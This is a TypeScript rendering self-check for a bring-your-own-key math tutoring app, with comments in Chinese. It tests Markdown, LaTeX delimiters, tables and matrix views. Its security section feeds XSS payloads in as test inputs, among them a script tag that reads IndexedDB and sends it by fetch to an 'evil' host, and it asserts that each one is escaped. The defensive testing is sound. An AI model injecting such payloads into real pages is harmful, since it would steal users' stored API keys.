/**
 * 渲染自检。
 *
 * 覆盖面是「模型实际会写出来的东西」:Markdown 标记、各种形态的公式定界符、
 * 以及**恶意输出**。中间那条不是洁癖 —— 这是个 BYOK 应用,API Key 就在 IndexedDB 里,
 * 模型输出是不可信输入,渲染层必须从构造上就注入不了东西。
 *
 * 用 renderToStaticMarkup 在 node 里跑,不需要浏览器。
 * 运行:npm run check:render
 */
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { Derivation } from '../src/kinds/derivation/Derivation';
import { LinearView } from '../src/kinds/linear/LinearView';
import { MatrixView } from '../src/kinds/matrix/MatrixView';
import { parseSpec } from '../src/kinds/registry';
import { Markdown, MathBlock } from '../src/renderers/Markdown';
import { unwrap } from '../src/renderers/Latex';

let pass = 0;
let fail = 0;

function ok(name: string, cond: boolean, detail = '') {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

const md = (s: string) => renderToStaticMarkup(Markdown({ source: s }));

console.log('\n公式定界符 —— 这次报的 bug 就在这里');
for (const [input, label] of [
  [String.raw`\lim_{x\to 0}\sin\frac{1}{x}`, '裸 LaTeX'],
  [String.raw`$\lim_{x\to 0}\sin\frac{1}{x}$`, '$...$ 包裹'],
  [String.raw`$$\lim_{x\to 0}\sin\frac{1}{x}$$`, '$$...$$ 包裹'],
  [String.raw`\[\lim_{x\to 0}\sin\frac{1}{x}\]`, '\\[...\\] 包裹'],
  [String.raw`\(\lim_{x\to 0}\sin\frac{1}{x}\)`, '\\(...\\) 包裹'],
] as [string, string][]) {
  const got = unwrap(input);
  ok(`${label} 被剥成裸 LaTeX`, got === String.raw`\lim_{x\to 0}\sin\frac{1}{x}`, JSON.stringify(got));
}

ok('不该过度剥:只有一个 $ 时不处理', unwrap('$x') === '$x', unwrap('$x'));
ok('不该过度剥:普通公式原样返回', unwrap('x^2') === 'x^2');

console.log('\nMarkdown 块级');
ok('标题渲染成 h2', md('## 等价性').includes('<h2>'), md('## 等价性'));
ok('无序列表', (() => {
  const h = md('- 第一\n- 第二');
  return h.includes('<ul>') && h.match(/<li>/g)?.length === 2;
})(), md('- 第一\n- 第二'));
ok('有序列表', md('1. 第一\n2. 第二').includes('<ol>'), md('1. 第一\n2. 第二'));
ok('代码块', md('```\nf(x) = x^2\n```').includes('md-pre'), md('```\nf(x)\n```'));
ok('引用', md('> 注意边界情况').includes('<blockquote>'), md('> 注意'));
ok('分隔线', md('---').includes('<hr/>'), md('---'));
ok('负数不会被当成列表', !md('-1 是下界').includes('<ul>'), md('-1 是下界'));

console.log('\nMarkdown 行内 —— 「双星号没变粗」');
ok('**加粗**', md('这是**重点**').includes('<strong>重点</strong>'), md('这是**重点**'));
ok('**加粗** 紧贴中文也能用', md('这是**重点**').includes('<strong>重点</strong>'), md('这是**重点**'));
// `__粗体__` 在词中不生效是 CommonMark 的明文规定(为了保护 snake_case 标识符),
// GitHub 上也是同样行为 —— 所以这不是我们的缺口,是标准。模型基本只用 **。
ok('__粗体__ 在词中不生效(CommonMark 规定)', !md('这是__重点__').includes('<strong>'), '');
ok('__粗体__ 不在词中时正常', md('__重点__').includes('<strong>重点</strong>'), md('__重点__'));
ok('*斜体*', md('这是*强调*').includes('<em>强调</em>'), md('这是*强调*'));
ok('行内代码', md('用 `plot2d` 画').includes('<code>'), md('用 `plot2d` 画'));
ok('加粗里套代码', md('**用 `x` 表示**').includes('<strong>') && md('**用 `x` 表示**').includes('<code>'));
ok('加粗和公式混排', (() => {
  const h = md('**关键**：$x^2$');
  return h.includes('<strong>关键</strong>') && h.includes('katex');
})(), md('**关键**：$x^2$'));

console.log('\n恶意输出 —— BYOK 下模型输出是不可信输入');
{
  const h = md('<img src=x onerror="alert(1)">');
  ok('HTML 标签被转义,不成为元素', !h.includes('<img'), h);
}
{
  const h = md('<script>indexedDB.open("mathesis").onsuccess=e=>fetch("//evil",{body:e.target.result})</script>');
  ok('script 标签被转义', !h.includes('<script'), h);
}
{
  const h = md('[点我](javascript:alert(1))');
  ok('javascript: 链接不生成 <a>', !h.includes('<a '), h);
}
{
  const h = md('[维基](https://zh.wikipedia.org/wiki/极限)');
  ok('https 链接正常生成', h.includes('<a ') && h.includes('rel="noreferrer noopener"'), h);
}
{
  const h = md(String.raw`$\href{javascript:alert(1)}{x}$`);
  // trust:false 让 KaTeX 拒绝 \href,把它当未知命令渲染成红色报错。
  // 注意原始 TeX 会出现在 MathML 的 <annotation> 里(给读屏和复制用的),
  // 所以「输出里有没有 javascript: 这个字符串」不能当判据 —— 那串是**惰性文本**。
  // 真正的判据是:有没有产生 href 属性。
  ok('KaTeX 的 \\href 不产生任何链接', !h.includes('href='), h);
}

console.log('\n命题 / 前提的渲染路由 —— 第二次报的 bug 在这里');
// 注:Latex 的实际 DOM 注入在 useEffect 里,SSR 不执行,所以这里断言的是
// 「路由到公式渲染且 KaTeX 解析成功」—— 后者由 latex-fallback 是否出现来判定
// (useMemo 在 SSR 里是会跑的)。
const rendered = (tex: string) => renderToStaticMarkup(MathBlock({ tex }));

for (const [name, input] of [
  ['含 \\text{中文} 的命题', String.raw`\lim_{x\to 0}\sin\frac{1}{x}\ \text{不存在}`],
  ['中英混排的 given', String.raw`f(x)=\sin(1/x)\ \text{在}\ x=0\ \text{的去心邻域上有定义}`],
  ['带集合符号的 given', String.raw`\mathbb{R}\setminus\{0\}`],
  ['纯中文说明', '证明 sin(1/x) 在 0 处没有极限'],
] as [string, string][]) {
  const h = rendered(input);
  ok(`${name} 走公式渲染且解析成功`, h.includes('latex-display') && !h.includes('latex-fallback'), h);
}

{
  const h = rendered('设 $f$ 在 $x_0$ 处连续');
  ok('夹着 $ 的说明文字走混排渲染', h.includes('katex') && !h.includes('latex-fallback'), h);
}
{
  const h = rendered(String.raw`$\lim_{x\to 0}\sin\frac{1}{x}$`);
  // 同理:原始 TeX 会在 MathML 的 <annotation> 里出现,不能拿它当"没渲染"的判据。
  // 判据是:渲染出了 katex 结构,而且没有退化成 latex-fallback。
  ok('整体被 $ 包住时也不会退化成原始文本', h.includes('katex') && !h.includes('latex-fallback'), h);
}

console.log('\n不崩');
for (const [name, input] of [
  ['空字符串', ''],
  ['纯空白', '   \n\n  '],
  ['未闭合的公式', '计算 $x^2'],
  ['未闭合的代码块', '```\n没关'],
  ['未闭合的加粗', '这是**没关'],
  ['只有标记', '****'],
  ['嵌套列表', '- 外层\n  - 内层'],
  ['公式里带换行', '$$\\begin{aligned}\na &= b\n\\end{aligned}$$'],
] as [string, string][]) {
  ok(name, (() => {
    try {
      md(input);
      return true;
    } catch {
      return false;
    }
  })());
}

console.log('\nMarkdown 表格');

{
  const h = md('| 甲 | 乙 |\n|---|---|\n| 1 | 2 |');
  ok('基本表格能渲染', h.includes('<table') && h.includes('<th'), h);
  ok('表头和数据行都在', h.includes('<thead') && h.includes('<tbody'), h);
  ok('单元格内容对', h.includes('甲') && h.includes('乙') && h.includes('1'), h);
  ok('不会再吐出裸的管道符', !h.includes('|---'), h);
}

{
  // 首尾管道符可省略(GitHub 风格两种都接受)
  const h = md('甲 | 乙\n--- | ---\n1 | 2');
  ok('省略首尾管道符也认', h.includes('<table'), h);
}

{
  const h = md('| 左 | 中 | 右 |\n|:---|:---:|---:|\n| a | b | c |');
  ok('对齐方式被解析', h.includes('text-align:left') && h.includes('text-align:center') && h.includes('text-align:right'), h);
}

{
  // 单元格里的行内公式和粗体照常工作
  const h = md('| 形式 | 含义 |\n|---|---|\n| $Ax = b$ | 系数表 |\n| **线性映射** | 本身 |');
  ok('单元格里的公式容器在', h.includes('katex'), h);
  ok('单元格里的粗体在', h.includes('<strong>'), h);
}

{
  // 这一条最要紧:正文里的绝对值符号不能被当成表格。
  // 判据要求下一行是分隔行,所以 `|x|` 不会触发。
  const h = md('当 $|x| < \\delta$ 时\n\n以及 |x| 单独出现的时候');
  ok('正文里的 |x| 不被当成表格', !h.includes('<table'), h);
  ok('而且内容原样保留', h.includes('时'), h);
  ok('单独的 |x| 也不被当成表格', !md('这里 |x| 是绝对值').includes('<table'));
}

{
  // 表格后面接段落,段落不能被吞掉
  const h = md('| a | b |\n|---|---|\n| 1 | 2 |\n\n表格之后的段落。');
  ok('表格之后的段落仍在', h.includes('表格之后的段落'), h);
}

{
  // 表格前面有段落,段落要被正确截断
  const h = md('前面这句话。\n| a | b |\n|---|---|\n| 1 | 2 |');
  ok('表格之前的段落没被表格吞掉', h.includes('前面这句话'), h);
  ok('同时表格也渲染了', h.includes('<table'), h);
}

{
  // 残缺的行数(列数不齐)不能崩
  const ragged = md('| a | b | c |\n|---|---|---|\n| 1 |\n| 1 | 2 | 3 |');
  ok('列数不齐时不崩', ragged.includes('<table'), ragged);
}

{
  const h = md('| 单列 |\n|---|\n| 只有一个 |');
  ok('单列表格也能渲染', h.includes('<table'), h);
}

console.log('\n换库之后:多转义折叠插件要仍然生效');

{
  const B = String.fromCharCode(92);

  // 这个插件是我为换库新写的(rehype 跑在 rehype-katex **之前**)。
  // 不测的话,「多转义一层」那个刚修好的 bug 会悄悄回来。
  const h = md(`$${B}${B}times$`);
  ok('公式里的多转义反斜杠被折叠', h.includes('katex') && !h.includes('newline'), h.slice(0, 140));

  // 反向:合法的换行符不能被折掉(矩阵靠它分行)
  const keep = md(`$${B}begin{matrix}a ${B}${B} b${B}end{matrix}$`);
  ok('合法的换行仍然保留(矩阵靠它分行)', keep.includes('mtable'), keep.slice(0, 140));

  // 折叠之后要真的渲染成乘号,而不是「2 换行 times」。光查 includes('katex')
  // 是不够的 —— 折叠失败时它同样是 true(上一版这里就是假通过)。
  const ok2 = md(`$2${B}${B}times2$`);
  ok('折叠之后没有多余的换行', ok2.includes('katex') && !ok2.includes('newline'), ok2.slice(0, 140));
}

{
  // 换库之后这几条安全边界要重新确认 —— 它们是新库的行为,不是原来那条路径了
  ok('原始 HTML 不被渲染(没接 rehype-raw)', !md('<img src=x onerror="alert(1)">').includes('<img'), '');
  ok('script 标签不被渲染', !md('<script>alert(1)</script>').includes('<script'), '');
  ok('javascript: 链接被剥掉,不产生 <a>', !md('[点我](javascript:alert(1))').includes('<a '), '');
  ok('正常的 https 链接仍然是链接', md('[维基](https://zh.wikipedia.org)').includes('<a '), '');
  ok('链接带 noopener', md('[维基](https://zh.wikipedia.org)').includes('noopener'), '');
}

console.log('\n推导步骤的「理由」是散文,里面也会有公式');
{
  // reason 曾经是个纯文本 span。模型写理由时顺手带符号("支路电流 g_{ij}(v_i - v_j)"),
  // 学生看到的就是带下划线和花括号的原始 LaTeX —— 这条用例盯的就是那个。
  //
  // 必须用 createElement 而不是像上面那样直接调用组件:Derivation 有 useState,
  // 当函数调会在 renderToStaticMarkup 外面触发 hook。
  const step = (reason: string) => ({
    kind: 'derivation' as const,
    steps: [{ id: 's1', latex: String.raw`I_i = \sum_j g_{ij}(v_i - v_j)`, reason, gap: 'substantive' as const }],
  });
  const render = (reason: string) =>
    renderToStaticMarkup(createElement(Derivation, { spec: step(reason), artifactId: 'a', rev: 1, emit: () => {} }));

  // 步骤的 latex 走 <Latex>,它靠 effect 注入 HTML,在 SSR 下是空 span。
  // 所以输出里出现的 katex 只可能来自 reason —— 这条断言不会被 latex 蒙混过去。
  const okCase = render(String.raw`欧姆定律给出支路电流 $g_{ij}(v_i - v_j)$,KCL 要求流出节点 $i$ 的电流之和等于外部注入`);
  ok('带 $ 的理由渲染成公式', okCase.includes('katex'), okCase.slice(0, 160));
  ok('而且 $ 定界符本身不显示出来', !okCase.includes('$'), okCase.slice(0, 160));

  // 没有 $ 的兜底路径:MathText 会把整句交给 KaTeX。SSR 下它同样是空 span,
  // 但关键是**原始 LaTeX 不能再出现** —— 修复前这里打印的就是那段裸文本。
  const bareCase = render(String.raw`欧姆定律给出支路电流 g_{ij}(v_i - v_j);KCL 要求流出节点 i 的电流之和等于外部注入`);
  ok('没有 $ 时也不原样打印裸 LaTeX', !bareCase.includes('g_{ij}'), bareCase.slice(0, 160));
}

console.log('\n线性变换:可拖的手柄只在能反解时出现');

{
  // 拖动要把坐标写回参数,所以**只有元素恰好是一个参数名**时才画得出手柄 ——
  // 复合表达式(cos(t)、2*a)没法从坐标反解。这条规则很容易在以后被改坏,
  // 而坏了的表现是"手柄明明在、拖了却不动",很难查。
  const render = (spec: unknown, scope: Record<string, number>) =>
    renderToStaticMarkup(
      createElement(LinearView, {
        spec: parseSpec(spec) as never,
        scope,
        artifactId: 'A',
        rev: 1,
        onParam: () => {},
        emit: () => {},
      }),
    );

  const params = [
    { name: 'a', value: 1, min: -3, max: 3 },
    { name: 'b', value: 2, min: -3, max: 3 },
    { name: 'c', value: 2, min: -3, max: 3 },
    { name: 'd', value: 4, min: -3, max: 3 },
  ];
  // 元素全是参数名 ⇒ 可拖。而且 ad=4、bc=4 ⇒ 奇异,顺带验零空间那条线
  const asParams = render({ kind: 'linear', matrix: [['a', 'b'], ['c', 'd']], params }, { a: 1, b: 2, c: 2, d: 4 });
  // 元素是字面量 ⇒ 没有可写的参数,不该出现手柄
  const asLiterals = render({ kind: 'linear', matrix: [['1', '0'], ['0', '2']] }, {});

  ok('元素写成参数时画出可拖的手柄', asParams.includes('lin-handle'), '');
  ok('元素是字面量时不画手柄(拖不动的东西不该长得像能拖)', !asLiterals.includes('lin-handle'), '');
  ok('奇异矩阵画出零空间那条线', asParams.includes('lin-null'), '');
  ok('满秩矩阵不画零空间', !asLiterals.includes('lin-null'), '');
  ok('面板里说清了零空间', asParams.includes('零空间'), '');
}

console.log('\n矩阵卡片:行 × 列的过程');

{
  const render = (spec: unknown) =>
    renderToStaticMarkup(
      createElement(MatrixView, {
        spec: parseSpec(spec) as never,
        scope: {},
        artifactId: 'A',
        rev: 1,
        onParam: () => {},
        emit: () => {},
      }),
    );

  // A 的第 1 行 × B 的第 2 列:3×6 + 4×8 = 18 + 32 = 50
  const h = render({
    kind: 'matrix',
    rows: [['3', '4'], ['1', '2']],
    multiplyBy: [['5', '6'], ['7', '8']],
    focus: [0, 1],
  });

  ok('把行乘列展开成了一串加法', h.includes('3×6') && h.includes('4×8'), '');
  ok('也显示了逐项乘积', h.includes('= 18 + 32 ='), '');
  ok('以及最后的总和', h.includes('<strong>50</strong>'), '');
  ok('高亮了 A 的那一行', h.includes('hi-row'), '');
  ok('高亮了 B 的那一列', h.includes('hi-col'), '');
  // 聚焦格会同时落在某一行和某一列上,所以它必须还有自己的标记
  ok('聚焦的那一格另有标记', /class="mx-cell[^"]*\bsel\b/.test(h), '');
  ok('算出了 det', h.includes('det A'), '');
  ok('算出了转置', h.includes('Aᵀ'), '');
  ok('算出了逆', h.includes('A⁻¹'), '');

  // 维数配不上:必须**明说**,而不是留一个空位让人猜哪里错了
  const bad = render({ kind: 'matrix', rows: [['1', '2']], multiplyBy: [['1'], ['2'], ['3']] });
  ok('维数配不上时明说', bad.includes('才能相乘'), '');
  ok('而且不假装画出了结果', !bad.includes('A·B'), '');

  const solo = render({ kind: 'matrix', rows: [['1', '2'], ['3', '4']] });
  ok('单张矩阵时不显示乘法过程', !solo.includes('mx-step'), '');
  ok('单张矩阵仍然算派生量', solo.includes('det A') && solo.includes('A⁻¹'), '');

  // 非方阵没有 det / 逆 —— 不该硬显示一个数字出来
  const rect = render({ kind: 'matrix', rows: [['1', '2', '3'], ['4', '5', '6']] });
  ok('非方阵不显示 det', !rect.includes('det A'), '');
  ok('非方阵仍然显示转置', rect.includes('Aᵀ'), '');

  // 奇异矩阵:逆不存在,而那是**要讲给学生听的**情形,所以要明说
  const singular = render({ kind: 'matrix', rows: [['1', '2'], ['2', '4']] });
  ok('不可逆时明说不存在', singular.includes('不存在'), '');
  ok('并且指出 det 为 0 意味着什么', singular.includes('不可逆'), '');
}

console.log(`\n${pass} 通过, ${fail} 失败\n`);
process.exit(fail ? 1 : 0);
